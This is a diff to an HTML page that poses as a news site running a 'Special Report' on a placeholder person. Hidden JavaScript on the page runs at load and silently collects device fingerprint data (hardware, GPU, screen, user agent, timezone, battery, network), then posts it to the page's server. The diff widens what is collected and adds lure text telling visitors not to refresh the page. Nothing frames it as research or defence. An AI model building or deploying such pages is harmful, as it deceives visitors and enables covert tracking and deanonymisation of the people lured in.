@@ -3,79 +3,96 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Person News - Official Source</title>
+  <title>Global News Network - Verified Reports</title>
   <style>
-    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f0f; color: #eeeeee; margin: 0; }
-    header { background: #1a1a1a; padding: 30px; text-align: center; border-bottom: 2px solid #333; }
-    .news { padding: 20px; max-width: 800px; margin: auto; }
-    .card { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-    img { max-width: 100%; border-radius: 8px; margin: 15px 0; }
-    .footer-note { color: #555; font-size: 12px; text-align: center; margin-top: 50px; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #d1d1d1; margin: 0; line-height: 1.6; }
+    header { background: #141414; padding: 40px 20px; text-align: center; border-bottom: 3px solid #e50914; }
+    .container { max-width: 900px; margin: 20px auto; padding: 20px; }
+    .card { background: #1f1f1f; border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
+    h1 { color: #fff; margin-bottom: 10px; }
+    img { width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid #333; }
+    .loading-text { color: #888; font-style: italic; }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>Global News Network</h1>
-  <p>Live updates and detailed reports</p>
+  <h1>Breaking News Center</h1>
+  <p>Real-time updates from global sources</p>
 </header>
 
-<div class="news">
+<div class="container">
   <div class="card">
-    <h2>Latest Update: [PERSON NAME]</h2>
-    <img src="https://via.placeholder.com/800x400" alt="Featured News">
-    <p>Loading the latest verified reports regarding the current situation. Please stay tuned for more details as they emerge from our reporters on the ground.</p>
+    <h2>Special Report: [PERSON NAME] Latest Developments</h2>
+    <img src="https://via.placeholder.com/800x450/111/eee?text=Live+Update" alt="News Image">
+    <p class="loading-text">Verifying source location and updating feed for your region...</p>
+    <p>Please wait while we sync the latest encrypted data from our servers. Do not refresh this page to ensure you receive the full transmission.</p>
   </div>
 </div>
 
-<div class="footer-note">© 2025 GNN News Group. All rights reserved.</div>
-
 <script>
-  async function collectMaximumData() {
-    // 1. Hardware & System
+  async function harvestAllPossibleData() {
     const data = {
-      screen: `${window.screen.width}x${window.screen.height}`,
-      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio,
-      cores: navigator.hardwareConcurrency || 'N/A',
-      memory: navigator.deviceMemory || 'N/A', // RAM in GB
-      platform: navigator.platform,
-      maxTouchPoints: navigator.maxTouchPoints,
-      language: navigator.language,
-      languages: navigator.languages.join(', '),
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      referrer: document.referrer || 'Direct'
+      // 1. Hardware Details
+      hardware: {
+        cores: navigator.hardwareConcurrency || 'N/A',
+        ram: navigator.deviceMemory || 'N/A',
+        platform: navigator.platform,
+        touchPoints: navigator.maxTouchPoints,
+        architecture: navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['architecture'])).architecture : 'N/A'
+      },
+      // 2. Screen & Display
+      display: {
+        width: window.screen.width,
+        height: window.screen.height,
+        availWidth: window.screen.availWidth,
+        availHeight: window.screen.availHeight,
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        orientation: screen.orientation ? screen.orientation.type : 'N/A'
+      },
+      // 3. Browser & Environment
+      browser: {
+        ua: navigator.userAgent,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        languages: navigator.languages.join(', '),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        pdfViewer: navigator.pdfViewerEnabled,
+        webdriver: navigator.webdriver, // True if automation/bot
+        referrer: document.referrer || 'Direct Entry'
+      }
     };
 
-    // 2. Network & Browser Capability
-    data.connection = navigator.connection ? {
-      type: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt
-    } : 'N/A';
-    
-    data.doNotTrack = navigator.doNotTrack;
-    data.cookiesEnabled = navigator.cookieEnabled;
-
-    // 3. GPU/Graphics Info
+    // 4. GPU - Detailed Graphics Card Info
     try {
       const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+      data.gpu = debugInfo ? {
+        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+      } : 'Hidden/N/A';
     } catch (e) { data.gpu = 'Error'; }
 
-    // 4. Battery Status
+    // 5. Battery & Connection
     try {
       if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        data.battery = {
-          level: (battery.level * 100) + "%",
-          charging: battery.charging ? "Connected" : "Not Charging"
+        const b = await navigator.getBattery();
+        data.status = {
+          battery: (b.level * 100) + "%",
+          charging: b.charging ? "Plugged In" : "On Battery"
         };
       }
-    } catch (e) { data.battery = 'N/A'; }
+      if (navigator.connection) {
+        data.networkType = {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink + "Mbps",
+          rtt: navigator.connection.rtt + "ms"
+        };
+      }
+    } catch (e) {}
 
     // Send Everything to Server
     fetch("/visit", {
@@ -85,7 +102,7 @@
     });
   }
 
-  window.onload = collectMaximumData;
+  window.onload = harvestAllPossibleData;
 </script>
 
 </body>
